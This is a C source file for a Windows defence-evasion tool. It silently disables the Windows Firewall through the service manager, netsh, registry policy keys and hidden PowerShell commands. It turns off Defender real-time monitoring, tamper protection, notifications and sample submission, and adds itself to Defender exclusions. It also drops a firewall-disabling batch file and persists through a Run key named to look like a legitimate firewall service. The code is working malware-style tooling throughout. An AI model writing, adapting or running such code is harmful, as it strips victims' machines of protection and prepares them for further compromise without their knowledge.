#include <stdio.h>
#include <windows.h>
#include <netfw.h>
#include <objbase.h>
#include <oleauto.h>
#include <stdbool.h>
#include <shellapi.h>  

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shell32.lib")

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

bool DisableFirewallService() {
    SC_HANDLE scManager = NULL;
    SC_HANDLE scService = NULL;
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    bool success = false;

    scManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scManager == NULL) {
        printf("OpenSCManager failed (%lu)\n", GetLastError());
        return false;
    }

    scService = OpenServiceA(scManager, "MpsSvc", SERVICE_ALL_ACCESS);
    if (scService == NULL) {
        printf("OpenService failed (%lu)\n", GetLastError());
        CloseServiceHandle(scManager);
        return false;
    }

    if (QueryServiceStatusEx(scService, SC_STATUS_PROCESS_INFO,
                           (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS),
                           &bytesNeeded)) {
        
        if (ssp.dwCurrentState != SERVICE_STOPPED) {
            printf("Stopping Windows Firewall service...\n");


            if (ControlService(scService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp)) {
                printf("Windows Firewall service stopped successfully\n");
                success = true;
            } else {
                printf("Failed to stop Windows Firewall service (%lu)\n", GetLastError());
            }
        } else {
            printf("Windows Firewall service is already stopped\n");
            success = true;
        }
        if (ChangeServiceConfigA(
            scService,
            SERVICE_NO_CHANGE,
            SERVICE_DISABLED,  
            SERVICE_NO_CHANGE,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL)) {
            printf("Windows Firewall service set to disabled\n");
            success = true;
        } else {
            printf("Failed to disable Windows Firewall service (%lu)\n", GetLastError());
        }
    } else {
        printf("QueryServiceStatusEx failed (%lu)\n", GetLastError());
    }

    CloseServiceHandle(scService);
    CloseServiceHandle(scManager);
    
    return success;
}

bool DisableFirewallViaNetsh() {
    int result;

    printf("Disabling Domain Profile...\n");
    result = system("netsh advfirewall set domainprofile state off");
    if (result != 0) {
        printf("Failed to disable Domain Profile (%d)\n", result);
    }

    printf("Disabling Private Profile...\n");
    result = system("netsh advfirewall set privateprofile state off");
    if (result != 0) {
        printf("Failed to disable Private Profile (%d)\n", result);
    }

    printf("Disabling Public Profile...\n");
    result = system("netsh advfirewall set publicprofile state off");
    if (result != 0) {
        printf("Failed to disable Public Profile (%d)\n", result);
    }
    
    printf("Checking firewall status...\n");
    result = system("netsh advfirewall show allprofiles > nul");
    
    return (result == 0);
}

bool DisableWindowsDefender() {
    int result;
    
    printf("Disabling Windows Defender Real-time protection...\n");
    result = system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\" > nul 2>&1");
    if (result != 0) {
        printf("Failed to disable real-time protection (%d)\n", result);
    }
    printf("Disabling Windows Defender Tamper Protection...\n");
    result = system("powershell -Command \"Set-MpPreference -DisableTamperProtection $true\" > nul 2>&1");

    if (result != 0) {
        printf("Failed to disable tamper protection (%d)\n", result);
    }

    printf("Disabling sample submission...\n");
    result = system("powershell -Command \"Set-MpPreference -SubmitSamplesConsent 0\" > nul 2>&1");
    if (result != 0) {
        printf("Failed to disable sample submission (%d)\n", result);
    }
    
    return (result == 0);
}
bool DisableSecurityNotifications() {
    int result;
    
    printf("Disabling security notifications...\n");
    result = system("powershell -Command \"Set-MpPreference -DisableEnhancedNotifications $true\" > nul 2>&1");
    if (result != 0) {
        printf("Failed to disable security notifications (%d)\n", result);
    }
    
    return (result == 0);
}

bool AddSelfToExclusions() {
    char path[MAX_PATH];
    int result;

    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) {
        printf("Failed to get current executable path (%lu)\n", GetLastError());
        return false;
    }
    
    printf("Adding current executable to exclusions: %s\n", path);

    char command[1024];
    sprintf(command, "powershell -Command \"Add-MpPreference -ExclusionPath '%s'\" > nul 2>&1", path);
    
    result = system(command);
    if (result != 0) {
        printf("Failed to add exclusion (%d)\n", result);
        return false;
    }
    
    printf("Successfully added to exclusions\n");
    return true;
}

bool DisableFirewallViaRegistry() {
    HKEY hKey;
    DWORD value = 0; 
    bool success = false;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                     "SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile", 
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        
        if (RegSetValueExA(hKey, "EnableFirewall", 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS) {
            success = true;
        }
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                     "SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile", 
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        
        if (RegSetValueExA(hKey, "EnableFirewall", 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS) {
            success = true;
        }
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                     "SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile", 
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        
        if (RegSetValueExA(hKey, "EnableFirewall", 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS) {
            success = true;
        }
        RegCloseKey(hKey);
    }
    if (!success) {
        if (RegCreateKeyExA(HKEY_CURRENT_USER, 
                          "SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile", 
                          0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            if (RegSetValueExA(hKey, "EnableFirewall", 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS) {
                success = true;
            }
            RegCloseKey(hKey);
        }
        if (RegCreateKeyExA(HKEY_CURRENT_USER, 
                          "SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile", 
                          0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            if (RegSetValueExA(hKey, "EnableFirewall", 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS) {
                success = true;
            }
            RegCloseKey(hKey);
        }
        if (RegCreateKeyExA(HKEY_CURRENT_USER, 
                          "SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile", 
                          0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            if (RegSetValueExA(hKey, "EnableFirewall", 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS) {
                success = true;
            }
            RegCloseKey(hKey);
        }
    }
    return success;
}
bool DisableFirewallViaPowerShell() {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;

    char cmdLine[1024];
    bool success = false;

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    ZeroMemory(&si, sizeof(si));

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));
    sprintf(cmdLine, "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"$current = Get-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile' -Name 'EnableFirewall' -ErrorAction SilentlyContinue; if ($current -eq $null) { New-Item -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall' -Force | Out-Null; New-Item -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile' -Force | Out-Null; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile' -Name 'EnableFirewall' -Value 0 -PropertyType DWORD -Force | Out-Null } else { Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile' -Name 'EnableFirewall' -Value 0 | Out-Null }\"");
    if (CreateProcessA(NULL, cmdLine, &sa, &sa, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        success = true;
    }
    sprintf(cmdLine, "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"$current = Get-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile' -Name 'EnableFirewall' -ErrorAction SilentlyContinue; if ($current -eq $null) { New-Item -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile' -Force | Out-Null; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile' -Name 'EnableFirewall' -Value 0 -PropertyType DWORD -Force | Out-Null } else { Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile' -Name 'EnableFirewall' -Value 0 | Out-Null }\"");
    if (CreateProcessA(NULL, cmdLine, &sa, &sa, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        success = true;
    }
    sprintf(cmdLine, "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"$current = Get-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile' -Name 'EnableFirewall' -ErrorAction SilentlyContinue; if ($current -eq $null) { New-Item -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile' -Force | Out-Null; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile' -Name 'EnableFirewall' -Value 0 -PropertyType DWORD -Force | Out-Null } else { Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile' -Name 'EnableFirewall' -Value 0 | Out-Null }\"");
    if (CreateProcessA(NULL, cmdLine, &sa, &sa, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        success = true;
    }
    
    return success;
}
bool CreateFirewallDisablerScript() {
    FILE *file;
    bool success = false;
    file = fopen("disable_firewall.bat", "w");
    if (file) {
        fprintf(file, "@echo off\n");
        fprintf(file, "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$key = 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall'; if (!(Test-Path $key)) { New-Item -Path $key -Force | Out-Null }\"\n");
        fprintf(file, "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$key = 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile'; if (!(Test-Path $key)) { New-Item -Path $key -Force | Out-Null }; New-ItemProperty -Path $key -Name 'EnableFirewall' -Value 0 -PropertyType DWORD -Force | Out-Null\"\n");
        fprintf(file, "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$key = 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile'; if (!(Test-Path $key)) { New-Item -Path $key -Force | Out-Null }; New-ItemProperty -Path $key -Name 'EnableFirewall' -Value 0 -PropertyType DWORD -Force | Out-Null\"\n");
        fprintf(file, "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$key = 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile'; if (!(Test-Path $key)) { New-Item -Path $key -Force | Out-Null }; New-ItemProperty -Path $key -Name 'EnableFirewall' -Value 0 -PropertyType DWORD -Force | Out-Null\"\n");
        fprintf(file, "netsh advfirewall set allprofiles state off > NUL 2>&1\n");   
        fclose(file);
        success = true;
    }
    
    return success;
}

bool AddToAutoRun() {
    HKEY hKey;
    char path[MAX_PATH];
    bool success = false;
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) {
        return false;
    }
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {

        if (RegSetValueExA(hKey, "WindowsFirewallService", 0, REG_SZ, 
                         (BYTE*)path, strlen(path) + 1) == ERROR_SUCCESS) {
            success = true;
        }
        
        RegCloseKey(hKey);
    }
    return success;
}

int main(int argc, char *argv[]) {
    bool success = false;

    HANDLE hMutex = CreateMutexA(NULL, TRUE, "FirewallDisablerMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }
    success = DisableFirewallViaRegistry();
    if (!success) {
        success = DisableFirewallViaPowerShell();
    }
    CreateFirewallDisablerScript();
    AddToAutoRun();
    
    if (hMutex) {
        CloseHandle(hMutex);
    }
    
    return 0;
}
